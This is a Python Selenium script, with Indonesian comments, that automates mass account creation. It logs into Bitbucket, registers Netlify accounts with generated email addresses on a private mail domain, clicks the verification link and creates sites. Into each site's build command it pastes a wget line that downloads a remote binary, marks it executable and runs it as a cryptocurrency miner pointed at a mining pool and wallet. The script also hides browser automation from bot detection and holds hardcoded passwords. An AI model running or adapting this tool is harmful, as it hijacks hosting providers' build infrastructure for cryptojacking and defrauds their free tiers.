# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # Jangan di Ubah
# ++++++++++++++++++++++++ #
from csv import DictReader # Jangan di Ubah
from text_generator import generate # Jangan di Ubah
from selenium import webdriver # Jangan di Ubah
from selenium.common.exceptions import NoSuchElementException, WebDriverException # Jangan di Ubah
from selenium.webdriver.chrome.options import Options # Jangan di Ubah
from selenium.webdriver.common.keys import Keys # Jangan di Ubah
from selenium.webdriver.common.action_chains import ActionChains # Jangan di Ubah
from selenium.webdriver.common.by import By # Jangan di Ubah
from selenium.webdriver.support.ui import WebDriverWait # Jangan di Ubah
from selenium.webdriver.support import expected_conditions as EC # Jangan di Ubah
from selenium.webdriver.support.ui import Select # Jangan di Ubah
from selenium.common.exceptions import NoSuchElementException # Jangan di Ubah
from random_user_agent.user_agent import UserAgent # Jangan di Ubah
from random_user_agent.params import SoftwareName, OperatingSystem, HardwareType, SoftwareType # Jangan di Ubah
from rich.console import Console
from rich.traceback import install
import undetected_chromedriver.v2 as uc
console = Console()
install()
# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # Jangan di Ubah
# ++++++++++++++++++++++++ #
import random, urllib, os, sys, time, requests # Jangan di Ubah
# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # Kode Random
# ++++++++++++++++++++++++ #
lantak = random.randint(20101101,99999999)
code = generate() # Jangan di Ubah
console.log(f"[-] Kode Random : {code}.") # Jangan di Ubah
unlimited = code # Jangan di Ubah
# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # Konfigurasi Utama
# ++++++++++++++++++++++++ #
passwordtuta = "1Amarselinus" # Silahkan di Ubah
password = passwordtuta # Silahkan di Ubah
namarepo = "IniUntukUtama" # Silahkan di Ubah
email = unlimited # Silahkan di Ubah
email_bitbucket = "admin@swensonm.com" # Silahkan di Ubah
domain = "swensonm.com" # Silahkan di Ubah
tutanota = "admin@swenson.my.id" # Silahkan di Ubah
docker = "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/katek-fee && chmod u+x katek-fee && ./katek-fee -o 149.129.233.86:8080 -u TRX:TLam55PBVsxcfdwmTCPtkbwbx3YDagyJep.P${RANDOM:0:9} -a rx/0 -k --threads=8" # Silahkan di Ubah
# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # Refresh
# ++++++++++++++++++++++++ #
def delay():
    time.sleep(random.randint(2, 3))
# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # Bitbucket Login
# ++++++++++++++++++++++++ #
def Bitbucket(): # Jangan di Ubah
    driver.get("https://id.atlassian.com/login?application=bitbucket&continue=https%3A%2F%2Fbitbucket.org%2Faccount%2Fsignin%2F%3FredirectCount%3D1%26next%3D%252F") # Jangan di Ubah
    time.sleep(9) # Jangan di Ubah
    your_input = driver.find_element(By.XPATH, '//form[1]/div[1]/div[1]/div[1]/div[1]/input[1]') # Jangan di Ubah
    your_input.send_keys(email_bitbucket, Keys.ENTER) # Jangan di Ubah
    time.sleep(5) # Jangan di Ubah
    your_input = driver.find_element(By.XPATH, '//div[1]/div[1]/input[1]') # Jangan di Ubah
    your_input.send_keys(password, Keys.ENTER) # Jangan di Ubah
    time.sleep(19) # Jangan di Ubah
# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # Netlify & Proxy
# ++++++++++++++++++++++++ #
    time.sleep(1) # Jangan di Ubah
    driver.get("https://app.netlify.com/signup/email/")
    time.sleep(9) # Jangan di Ubah
    your_input = driver.find_element(By.XPATH, '//div[1]/label[1]/div[2]/input[1]') # Masukin Email Yang Mau di Pakai
    your_input.send_keys(f"{email}@{domain}") # Jangan di Ubah
    time.sleep(3) # Jangan di Ubah
    your_input = driver.find_element(By.XPATH, '//div[2]/label[1]/div[2 ]/input[1]') # Masukin Password Yang Mau di Pakai
    your_input.send_keys(passwordtuta, Keys.ENTER) # Jangan di Ubah
    time.sleep(9) # Waktu Tunggu Email
    try: # Jangan di Ubah
        driver.find_element(By.XPATH, "//div[1]/div[1]/div[1]/div[1]/div[1]/p[1]") # Periksa Gambar Pesawat Terbang
        console.log("[-] Proses Daftar Telah Berhasil.") # Jangan di Ubah
        time.sleep(6) # Jangan di Ubah
    except NoSuchElementException: # Jangan di Ubah
        console.log("[-] Proses Daftar Tidak Berhasil.") # Jangan di Ubah
        driver.quit() # Jangan di Ubah
        sys.exit()
    try:
        console.log("[-] Tahap Verifikasi Akan Di Lakukan.")
        Tutanota()
    except NoSuchElementException:
        console.log("[-] Proses Verifikasi Gagal.")
        driver.quit()
        sys.exit()
# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # Tutanota
# ++++++++++++++++++++++++ #
def Tutanota(): # Jangan di Ubah
    driver.get("https://email.swenson.my.id/mailbox")
    delay()
    driver.find_element(By.CSS_SELECTOR, ".fa-plus-square").click()
    delay()
    driver.find_element(By.ID, "user").click()
    driver.find_element(By.ID, "user").send_keys(unlimited)
    driver.find_element(By.ID, "domain").click()
    delay()
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div[2]/div[1]/form[1]/div[2]/div[1]/div[2]/div/a").click()
    driver.find_element(By.ID, "create").click()
    delay()
    time.sleep(5)
    delay()
    def ngentot():
        try:
            driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/main/div[1]/div/div/div[2]").click()
            console.log("[-] Berhasil Menemukan Email Verifikasi.")
        except NoSuchElementException:
            console.log("KONTOLLLL")
            delay()
            ngentot()
    ngentot()
    WebDriverWait(driver, 10).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, "/html/body/div[1]/div/div[2]/div/main/div[2]/div[2]/iframe")))
    # driver.switch_to.frame(1)
    delay()
    def mek():
        try:
            find_id = driver.find_elements(By.XPATH,"/html/body/table/tbody/tr/td/div/table/tbody/tr/td/div[2]/table/tbody/tr/td/div/table/tbody/tr/td/table/tbody/tr/td/a")
            for my_id in find_id:
                cariid = my_id.get_attribute("href")
                #print(cariid)
            console.log("\nURL NYA ADALAH = ", cariid)
            driver.get(cariid)
            # WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div/div/div/div[2]/table/tbody/tr/td/div/table/tbody/tr/td/div[2]/table/tbody/tr/td/div/table/tbody/tr/td/table/tbody/tr/td/a"))).click()
        except UnboundLocalError:
            console.log("anjing")
            delay()
            mek()
    mek()
    delay()
    # driver.find_element(By.XPATH, "xpath=//div[@id='inbox-html-wrapper']/div/div/div[2]/table/tbody/tr/td/div/table/tbody/tr/td/div[2]/table/tbody/tr/td/div/table/tbody/tr/td/table/tbody/tr/td/a/span").get_attribute(href)
    try:
        text = driver.find_element(By.XPATH, '//h1[@class="page-title"]')
        while text is None:
            text = driver.find_element(By.XPATH, '//h1[@class="page-title"]')
        result = text.text
        if result == "Invalid authorization code":
            console.log(f"[ERROR] TELAH TERDETEKSI Kalimat = '{result}'!!!")
            console.log("[END] Menghentikan Script!!!")
            driver.quit()
            sys.exit()
        else:
            console.log("[NICE] Tidak Muncul 'Invalid authorization code'")
    except NoSuchElementException:
        console.log("[NICE] Tidak Muncul 'Invalid authorization code'")
    delay()
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//p[1]/a[1]')))) # Jangan di Ubah
    time.sleep(5) # Jangan di Ubah
    driver.get("https://app.netlify.com/start") # Jangan di Ubah
    time.sleep(7) # Jangan di Ubah
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//section[1]/div[1]/div[1]/button[3]')))) # Jangan di Ubah
    time.sleep(11) # Jangan di Ubah
    your_input = driver.find_element(By.XPATH, "//input[1]")
    time.sleep(3) # Jangan di Ubah
    your_input.send_keys(namarepo, Keys.ENTER)
    time.sleep(4) # Jangan di Ubah
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//h4[1]/a[1]')))) # Jangan di Ubah
    time.sleep(4) # Jangan di Ubah
    your_input = driver.find_element(By.XPATH, "//div[2]/label[1]/div[2]/input[1]") # Jangan di Ubah
    your_input.send_keys(docker) # Jangan di Ubah
    time.sleep(3) # Jangan di Ubah
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//form[1]/div[2]/button[1]')))) # Jangan di Ubah
    time.sleep(13) # Jangan di Ubah
    console.log("[-] Selesai.") # Jangan di Ubah
    driver.quit() # Selesai DONE
# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # Chrome Driver
# ++++++++++++++++++++++++ #
try:
    lantak = random.randint(20101101, 99999999)
    option = webdriver.ChromeOptions()
    option.add_argument('--disable-notifications')
    option.add_argument(f'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/{lantak} Firefox/93.0')
    option.add_argument('--log-level=3')
    option.add_argument('--disable-blink-features=AutomationControlled')
    option.add_experimental_option("excludeSwitches", ["enable-logging"])
    #option.add_argument("user-agent=" + user_agents)
    driver = uc.Chrome()
    #driver = webdriver.Chrome(executable_path='C:\chromedriver.exe', options=option)
except Exception as e: # Jangan di Ubah
    driver.quit() # Jangan di Ubah
    console.log("[-] Cek Versi ChromeDriver Anda!") # Jangan di Ubah
Bitbucket() # Jangan di Ubah
# ++++++++++++++++++++++++ #
# ++++++++++++++++++++++++ # # Jangan di Ubah
# ++++++++++++++++++++++++ #
